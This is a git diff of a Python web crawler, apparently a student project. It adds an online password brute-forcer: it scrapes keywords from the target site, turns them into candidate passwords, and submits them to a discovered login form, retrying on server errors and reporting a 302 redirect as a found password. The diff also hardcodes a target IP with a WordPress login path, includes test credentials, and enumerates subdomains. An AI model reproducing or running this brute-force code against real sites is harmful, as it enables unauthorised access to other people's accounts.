@@ -1,11 +1,16 @@
 from html_parser import HTMLParser
-from requests import get_request, post_request
+from requests import get_request, post_request, get_status
 from url_utils import extract_url_parts, reformat_url
+
+import argparse
 import collections
 import password_generator
 import socket
+import nltk
+import time
 
 password_list = []
+username = 'user'
 MAX_DEPTH = 10
 SUBDOMAINS_FILE_PATH = './subdomains-100.txt'
 
@@ -98,6 +103,58 @@ def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen):
     add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen)
     process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack) 
 
+def brute_force_pass(username ,url, header_dict, keywords):
+
+    print(username)
+
+    if username == "":
+        username = "admin"
+    
+    url = reformat_url(url)
+    html = get_request(url, header_dict)
+    htmlParser = HTMLParser(html)
+    wordCount = 0
+    passwordSet = set()
+    for word in keywords:
+        print(word, '  :  ', password_generator.generate_password_list(word))
+        passwordSet.update(password_generator.generate_password_list(word))
+    
+    for word in passwordSet:
+        if (wordCount == 10):
+            word = 'IncognitoWebCrawl'
+
+        print('PASSWORD TESTED : ', word)
+        login_string = htmlParser.create_login_string(username, word)
+        post = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': str(len(login_string))}
+        post_response = post_request(url, post, login_string)
+
+        while (get_status(post_response) > 500):
+            time.sleep(1)
+            post_response = post_request(url, post, login_string)
+        print('status code for word ', word, ' is : ', get_status(post_response))
+        if (get_status(post_response) == 302):
+            print('PASSWORD FOUND : ', word)
+            return
+        wordCount += 1
+    
+    print('PASSWORD NOT FOUND')
+
+def find_url_with_login(urlset):
+    for url in urlset:
+        print(url)
+        
+        url = reformat_url(url)
+        response = get_request(url, {})
+        parser = HTMLParser(response)
+        if (parser.detect_login_form()):
+            return url
+            
+    
+    print('LOGIN FORM NOT FOUND')
+
+
 def read_subdomains():
     with open(SUBDOMAINS_FILE_PATH, "r") as f:
         return {subdomain.rstrip() for subdomain in f}
@@ -115,20 +172,62 @@ def get_subdomains(url):
     return {subdomain + '.' + host for subdomain in subdomains}
 
 def web_crawler():
-    url = 'http://google.com'
-    url = reformat_url(url)
+
+
     """
+
+    url = 'http://3.16.219.26/wp-login.php'
+    url = reformat_url(url)
+    headerdict = {}
+    response = get_request(url, headerdict)
+    print(headerdict)
+
+    html = HTMLParser(response)
+    if (html.detect_login_form()):
+        print('AAAAA')
+    
+    else:
+        print('BBBBBB')
+    
+    loginString = html.create_login_string('user','IncognitoWebC33rawl')
+    print(loginString)
+    post = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': str(len(loginString))}
+    postResponse = post_request(url, post, loginString)
+
+    print(get_status(postResponse))
+
+    """
+
+    url = 'http://3.16.219.26/'
+    url = reformat_url(url)
+    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
+    print('Login Form :' , forms_bfs)
+    ##print('LOGIN : ',find_url_with_login(seen_bfs))
+    brute_force_pass('user', forms_bfs.pop(), {}, keywords_bfs)
+
+    """
+    
     keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
     print('\n\nKeywords:', keywords_bfs, '\n\nForm:', forms_bfs, '\n\nSeen:', seen_bfs, sep=' ')
 
+    print('\n\n\n\n\n')
+
+    if (len(forms_bfs) == 1):
+        brute_force_pass('user', 'www.google.com', {}, keywords_bfs)
+    
+"""
+
+"""
     print()
 
     keywords_dfs, forms_dfs, seen_dfs = crawl_dfs(url, {})
     print('\n\nKeywords:', keywords_dfs, '\n\nForm:', forms_dfs, '\n\nSeen:', seen_dfs, sep=' ')
-    """
+    
 
-    print(get_subdomains(url))
-    """
+    print('\n\n\n', get_subdomains(url))
+
     for subdomain in get_subdomains(url):
         try:
             #Test whether subdomain exists 
@@ -142,5 +241,33 @@ def web_crawler():
             conn.close()
     """
 if __name__ == '__main__':
-    web_crawler()
+    parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
+    parser.add_argument('--u', nargs = 1, type = str, help = 'USERNAME')
+    parser.add_argument('--maxdepth', nargs = 1, type = int, help = 'MAX DEPTH TO CRAWL')
+    parser.add_argument('--maxpages', nargs = 1, type = int, help = 'MAX PAGES TO CRAWL')
+    parser.add_argument('--mode', nargs = 1, type = str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
+    args = parser.parse_args()
+    username, mode = '',''
+    maxdepth, maxpage = 0,0
+    if (args.u ==None):
+        username = 'admin'
+    else :
+        username = args.u.pop()
+    if (args.maxdepth == None):
+        maxdepth = 10
+    else :
+        maxdepth = args.maxdepth.pop()
+    if (args.maxpages == None):
+        maxpage = 10
+    else :
+        maxpage = args.maxpages.pop()
+    if (not(args.mode == 'bfs' or args.mode == 'dfs')):
+        mode = 'bfs'
+    else :
+        mode = args.mode.pop()
+
+    print(username, ' ', maxdepth, ' ', maxpage, ' ', mode)
+
+    
+    ##web_crawler()
     
